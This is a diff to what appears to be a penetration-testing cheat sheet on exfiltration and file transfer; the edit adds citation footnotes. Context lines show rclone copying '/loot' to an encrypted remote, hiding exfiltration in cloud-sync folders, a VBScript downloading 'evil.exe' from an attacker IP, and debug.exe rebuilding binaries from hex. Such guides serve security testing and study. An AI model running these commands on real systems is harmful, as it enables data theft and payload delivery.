@@ -318,7 +318,7 @@ rclone copy /loot secret:$(hostname)-$(date +%F) \
 ```
 
 Notes:
-- `crypt` can encrypt both file contents and names.
+- `crypt` can encrypt both file contents and names.<sup>[[3]](#references)</sup>
 - `chunker` transparently splits large files and reassembles them on download.
 - `rclone.conf` stores `crypt` secrets in an **obscured** form, not strong at-rest protection. For short-lived operations, prefer a dedicated temporary config and remove it afterwards. If you must keep it longer, prefer encrypted config handling (`RCLONE_CONFIG_PASS` / `--password-command`) over leaving a bare `rclone.conf` on disk.
 - If the target already syncs **OneDrive**, **Google Drive**, or **Dropbox**, copying loot into the synchronized directory can piggyback on an already-approved client instead of dropping a new transfer binary.
@@ -612,7 +612,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 
 ## Debug.exe
 
-The `debug.exe` program not only allows inspection of binaries but also has the **capability to rebuild them from hex**. This means that by providing an hex of a binary, `debug.exe` can generate the binary file. However, it's important to note that debug.exe has a **limitation of assembling files up to 64 kb in size**.
+The `debug.exe` program not only allows inspection of binaries but also has the **capability to rebuild them from hex**. This means that by providing an hex of a binary, `debug.exe` can generate the binary file. However, it's important to note that debug.exe has a **limitation of assembling files up to 64 kb in size**.<sup>[[1]](#references)</sup>
 
 ```bash
 # Reduce the size
